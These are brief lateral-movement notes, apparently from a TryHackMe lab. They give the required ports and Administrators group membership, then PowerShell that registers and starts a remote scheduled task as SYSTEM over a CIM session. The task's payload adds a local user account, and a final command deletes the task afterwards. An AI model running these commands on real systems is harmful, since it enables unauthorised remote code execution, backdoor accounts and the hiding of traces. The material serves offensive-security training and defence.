#### Requirements
- **Ports:** 
	- 135/TCP, 49152-65535/TCP (DCERPC)
	- 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
	
- **Required Group Memberships:** Administrators

#### Create and Execute Scheduled Tasks by using some cmdlets available in Windows default installation
```powershell
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

#### Delete the Scheduled Tasks after it has been used
```powershell
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```